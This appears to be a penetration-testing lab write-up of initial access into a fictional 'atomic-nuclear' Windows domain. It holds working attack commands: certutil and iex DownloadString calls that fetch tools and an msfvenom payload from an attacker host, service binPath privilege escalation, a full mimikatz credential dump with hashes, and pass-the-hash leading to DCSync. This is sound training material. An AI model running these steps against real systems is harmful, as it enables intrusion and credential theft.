# Initial Access

- [Initial Access](#initial-access)
  - [Recon Recap](#recon-recap)
  - ["Escaping" VDI](#escaping-vdi)
  - [Local Enumeration - VDI Server](#local-enumeration---vdi-server)
  - [Local Privilege Escalation](#local-privilege-escalation)
  - [Credential Dump](#credential-dump)
  - [Domain Enumeration](#domain-enumeration)

----

## Recon Recap

From OSINT, we know the target is using VDI:

[1]<br/>

VDI Password revealed

Browsing <http://atomic-nuclear.s3.amazonaws.com/secret.txt>:
```
Atomic Nuclear PowerPlant Site Configuration : atomic-nuclear.site

Remote VDI Password:  Sc!ent!st@1221  


Note: This File Contains Sensitive Information. 
```

<br/>

Also, from subdomain enumeration, we know:

```
atomic-nuclear.site
www.atomic-nuclear.site
git.atomic-nuclear.site
mail.atomic-nuclear.site
rds.atomic-nuclear.site
secretserver.atomic-nuclear.site
vdi.atomic-nuclear.site
```

<br/>

Browse `vdi.atomic-nuclear.site`:

![picture 2](images/cfb63403608e93fd431ca85bef365217c6d8e3b6cb57dd89aa7ff4ca88c32afb.png)  


* It is infact an IIS page.

<br/>

Goolging for IIS and VDI, we know if VDI & RDP are enabled, the uri will be `/rdweb`. (Ref: https://social.technet.microsoft.com/Forums/lync/en-US/3ddf94f7-f447-493f-88d5-7b915e61d7cc/rds-vdi-gateway-server-and-url-query?forum=winserverTS)

<br/>

Browse `https://vdi.atomic-nuclear.site/rdweb`:

![picture 1](images/2a6d1988efe4097a52b28a1cdff6b7ecba370284068ccdb7b34b1e5ffd25a401.png)

To access, we need:

1. Domain - `atomic.site` / `nuclear.site` / `scada.local` from SSL cert
2. Username - `homi` / `iyer` from LinkedIn
3. Password - `Sc!ent!st@1221` revealed in the secret note

<br/>

Logon successfully using `nuclear\iyer` with password `Sc!ent!st@1221`:

![picture 3](images/79bcd73b513562f691bd52cc8e77b94ac35dc9fdd1f2196d47286fbeb95c1277.png)  

<br/>

Try to run the RDP file using `xfreerdp`:

```
xfreerdp cpub-WordPad-QuickSessionCollection-CmsRdsh.rdp
```

![picture 4](images/9aa07c5e6314e5393d6f15489164e9475e0daf4e22bfba52110a4b1331866021.png)  

<br/>

Try to use `nslookup` to check the IP address of `vdi.atomic-nuclear.site`:

![picture 5](images/d7fc3921a5f55b56aa99f958da01748539d736a1aabf418d3933bdc5942fbf2d.png)  

* 192.168.8.2

<br/>

Inspecting the RDP file, the dest is `vdi-server.nuclear.site`:

![picture 6](images/79b45e3cbfaace24aa713fd96d004039b43bb4392f29530a03140c47bcc8e701.png)  

<br/>

Add this record into `/etc/hosts`:

```
192.168.8.2 vdi-server.nuclear.site
```

![picture 8](images/b669f4f9a8628c0ffc3b630e25ffa2f5b20dd70dd14169b5136eadac262e891a.png)  
 

<br/>

Then try to RDP to the host again:

```
xfreerdp cpub-WordPad-QuickSessionCollection-CmsRdsh.rdp
```

![picture 9](images/2718c585dcd535454ab62ac8114691617a9de013907dc4bed8a174779949e419.png)  

<br/>

Again use `nuclear\iyer` with password `Sc!ent!st@1221` with prompted. After connecting, a wordpad is shown:

![picture 10](images/7b4b06bbee1a033424f805ef66611152bf1d1b8b5de2042689f8dde33fe49531.png)  

<br/>

## "Escaping" VDI

With reference to https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/, we can "escape" by using `Save As -> Type cmd.exe on top and enter`:

![picture 11](images/c30e9686bca910386183355b3e0e381ff5026f1f987adab34e62f7e05346aafb.png)  

* As shown, we get a cmd prompt.

<br/>

## Local Enumeration - VDI Server

Check the network info:

```
ifconfig
```

![picture 12](images/938ce7467c898ed6bcb5356fae60b619ba1fa459dd2df18e445a809fb42f92fb.png)  

* `192.168.8.2`
* `10.1.1.8`

<br/>

Check local user and admin:

```
net user && net localgroup administrators
```

![picture 13](images/fde5b91a2fac426d8f9ba28170220bfe3e66ae2a70bdba83bbe34b4a419d514b.png)  

* `Nuclear\vdadmin` is the local admin

<br/>

Serve `winPEAS.exe` using python3 http.server on the attacker machine:

```
python3 -m http.server 80
```

![picture 14](images/8b23f498a9a2ed69327f8ab14d3c2173433b9977ef24bae9f3770bf3b10bba79.png)  

<br/>

On the VDI CMD, use `certutil` to download `winPEAS.exe`:

```
cd C:\Users\Public
certutil -urlcache -f http://192.168.100.11/winPEAS.exe .\winPEAS.exe
```

![picture 15](images/371e809f9cdd30924f6cae26ac22d655e7c29b2d208e8ccd0d6499d618a71ea9.png)  

<br/>

First run:

```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

<br/>

Relaunch the cmd and run:
```
cd C:\Users\Public\ && .\winPEAS.exe
```

![picture 16](images/a704e4f81ee240e265f39b95dfcec42ec8b8eeae22195099efb22b265391aa26.png)  

* We have full access to a service `SNMPTRAP`

<br/>

## Local Privilege Escalation

We can escalate our privilege by modifying the `BINPATH`, pointing it to a crafted payload which adds `nuclear\iyer` as local admin.

<br/>

To generate the payload, on the attacker machine, use `msfvenom` to generate an exe:

```
msfvenom -f exe -p windows/exec CMD="net localgroup administrators nuclear\iyer /add" > snmptrap.exe

python3 -m http.server 80
```

![picture 17](images/0eeec0b2c74eed2e1f756f0eb6abdf2e2420a0951ffe0094d1853f5cd4b9f515.png)  

<br/>

On the VDI CMD, download the crafted payload:

```
cd C:\Users\Public && certutil -urlcache -f http://192.168.100.11/snmptrap.exe .\snmptrap.exe
```

![picture 18](images/385ce131856373d9649540e0215f6bb133aaab2aed69dd9588147bda799e4016.png)  

<br/>

Then modify the `snmptrap` service `binpath`:

```
sc qc snmptrap && sc config snmptrap binPath= C:\Users\Public\snmptrap.exe && sc qc snmptrap
```

![picture 19](images/9e633e1a39cdaaf919e0a4188d75be31b648b246c1eed8b7ee5b901537debc2f.png)  

<br/>

Restart the service and inspect the local admin group:

```
sc stop snmptrap
net localgroup administrators
sc start snmptrap
net localgroup administrators
```

![picture 20](images/0847987298c875e29e33553d76465541e9fa42ec0bcbfd42fa4000f2b25c8dfd.png)  

![picture 21](images/f08e9c22318a887e39e463ce1d94961c85349cd11068a28649beab001a190155.png)  

<br/>

To make our permission effective, use `logoff` command to log out and log in and get a CMD again.

```
whoami /priv
```

![picture 22](images/3734527298af0eb84d0f95388ae97eadb353ee163b051b21611a11158ec34877.png)  


<br/>

## Credential Dump

Download `mimikatz` on the VDI machine:

```
certutil -urlcache -f http://192.168.100.11/mimikatz.exe .\mimikatz.exe
```

![picture 23](images/b708888fdc32ca5fedb8e556320f7abcd240c9e28cf98157385283ca6a54441e.png)  


<br/>

Then dump passwords:

```
.\mimikatz.exe
```

```
privilege::debug
sekurlsa::logonpasswords
```

Result:
```
C:\Users\Public>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:12 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 100995 (00000000:00018a83)
Session           : Service from 0
User Name         : vdadmin
Domain            : NUCLEAR
Logon Server      : NUCLEAR-DC
Logon Time        : 1/19/2021 11:31:12 AM
SID               : S-1-5-21-2753455963-2528838614-3718188604-1103
        msv :
         [00000003] Primary
         * Username : vdadmin
         * Domain   : NUCLEAR
         * NTLM     : 1fbba53e43f63e4b29fb31376bd33fda
         * SHA1     : 1ffa5bf359e7e54b5c231eba5a4fa94cef315e99
         * DPAPI    : 2e24b29abdefaff8329427c102e7fad5
        tspkg :
        wdigest :
         * Username : vdadmin
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : vdadmin
         * Domain   : NUCLEAR.SITE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : VDI-SERVER$
Domain            : NUCLEAR
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:10 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : vdi-server$
         * Domain   : NUCLEAR.SITE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3258841 (00000000:0031b9d9)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2021 9:48:20 PM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : VDI-SERVER$
         * Domain   : nuclear.site
         * Password : 9;/14$UF<o$iVAv!2IcUhu.uAQ1\`[kY)XnY\WYe3b"!d8!p9+a>93S#zdLC.j@k@s/!2>hnV)nf:*b:C'2KD'0)@uxp)E@^VJn[&9ky0C*A=Xx>h<1;E7$j
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:11 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2542070 (00000000:0026c9f6)
Session           : Service from 0
User Name         : RDWebAccess
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 1/19/2021 8:42:36 PM
SID               : S-1-5-82-604604840-3341247844-1790606609-4006251754-2470522317
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR.SITE
         * Password : (null)
        ssp :
         [00000000]
         * Username : VDI-SERVER$
         * Domain   : (null)
         * Password : (null)
        credman :

Authentication Id : 0 ; 3264007 (00000000:0031ce07)
Session           : RemoteInteractive from 3
User Name         : iyer
Domain            : NUCLEAR
Logon Server      : NUCLEAR-DC
Logon Time        : 1/19/2021 9:48:20 PM
SID               : S-1-5-21-2753455963-2528838614-3718188604-1105
        msv :
         [00000003] Primary
         * Username : iyer
         * Domain   : NUCLEAR
         * NTLM     : 1ed88c67da13a44c5d81879baf879d74
         * SHA1     : b493e08d2567cdbb0b1d73b63d5d8e6cdd685361
         * DPAPI    : d531e51d448139e9595aa58a7b5445d4
        tspkg :
        wdigest :
         * Username : iyer
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : iyer
         * Domain   : NUCLEAR.SITE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3226382 (00000000:00313b0e)
Session           : RemoteInteractive from 2
User Name         : iyer
Domain            : NUCLEAR
Logon Server      : NUCLEAR-DC
Logon Time        : 1/19/2021 9:46:54 PM
SID               : S-1-5-21-2753455963-2528838614-3718188604-1105
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 2537592 (00000000:0026b878)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 1/19/2021 8:41:47 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : VDI-SERVER$
         * Domain   : nuclear.site
         * Password : 9;/14$UF<o$iVAv!2IcUhu.uAQ1\`[kY)XnY\WYe3b"!d8!p9+a>93S#zdLC.j@k@s/!2>hnV)nf:*b:C'2KD'0)@uxp)E@^VJn[&9ky0C*A=Xx>h<1;E7$j
        ssp :
        credman :

Authentication Id : 0 ; 111235 (00000000:0001b283)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:12 AM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : VDI-SERVER$
         * Domain   : nuclear.site
         * Password : 9;/14$UF<o$iVAv!2IcUhu.uAQ1\`[kY)XnY\WYe3b"!d8!p9+a>93S#zdLC.j@k@s/!2>hnV)nf:*b:C'2KD'0)@uxp)E@^VJn[&9ky0C*A=Xx>h<1;E7$j
        ssp :
        credman :

Authentication Id : 0 ; 63096 (00000000:0000f678)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:11 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : VDI-SERVER$
         * Domain   : nuclear.site
         * Password : 9;/14$UF<o$iVAv!2IcUhu.uAQ1\`[kY)XnY\WYe3b"!d8!p9+a>93S#zdLC.j@k@s/!2>hnV)nf:*b:C'2KD'0)@uxp)E@^VJn[&9ky0C*A=Xx>h<1;E7$j
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : VDI-SERVER$
Domain            : NUCLEAR
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:11 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * Password : (null)
        kerberos :
         * Username : vdi-server$
         * Domain   : NUCLEAR.SITE
         * Password : (null)
        ssp :
         [00000000]
         * Username : VDI-SERVER$
         * Domain   : (null)
         * Password : (null)
         [00000001]
         * Username : VDI-SERVER
         * Domain   : (null)
         * Password : (null)
        credman :

Authentication Id : 0 ; 34207 (00000000:0000859f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/19/2021 11:31:10 AM
SID               :
        msv :
         [00000003] Primary
         * Username : VDI-SERVER$
         * Domain   : NUCLEAR
         * NTLM     : d66874caee4c5def429e68e396539771
         * SHA1     : c332b7ee20fe397224ca6b5ce545f34340d86df5
        tspkg :
        wdigest :
        kerberos :
        ssp :
         [00000000]
         * Username : VDI-SERVER$
         * Domain   : (null)
         * Password : (null)
        credman :

```

## Domain Enumeration

Use `PowerView.ps1` to enumerate the domain.

```
powershell -ep bypass
```

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/PowerView_dev.ps1"))
```

<br/>

Then check interesting ACLs:

```
Invoke-ACLScanner -ResolveGUIDs
```

![picture 24](images/1a5ceabb30692ed81c408883a786ffc5ddaacf54cd3270e28458b22bb718a15d.png)  

![picture 25](images/e59d169d1a7b753f02f76c92427a18d7f3218cf6fdf2ffdf66f1d401a862a3e9.png)  

- The user `vdadmin` has extended right to:
    - `DS-Replication-Get-Changes-In-Filtered-Set`
    - `DS-Replication-Get-Changes`
    - `DS-Replication-Get-Changes-All`
- These 3 permissions are the requirements of doing DCSync

<br/>

Note in the credential dump, we get the NTLM of `vdadmin`:
- `1fbba53e43f63e4b29fb31376bd33fda`

In this case, we may use the over-pass-the-hash technique to perform a DCSync.

<br/>

```
.\mimikatz.exe
```

```
sekurlsa::pth /domain:nuclear.site /user:vdadmin /ntlm:1fbba53e43f63e4b29fb31376bd33fda /run:cmd.exe
```

On the new prompt, run mimikatz again:

```
.\mimikatz.exe
```

```
privilege::debug
```

```
lsadump::dcsync /user:nuclear\administrator
```

![picture 26](images/8632b80110346250f514ebd5421eed7d5f709f2f7fd525ff8b10f6032ece5937.png)  

<br/>

* Domain Admin `administrator` NTLM: `4fc382c2e14308faef3de7494a08f27a`

<br/>

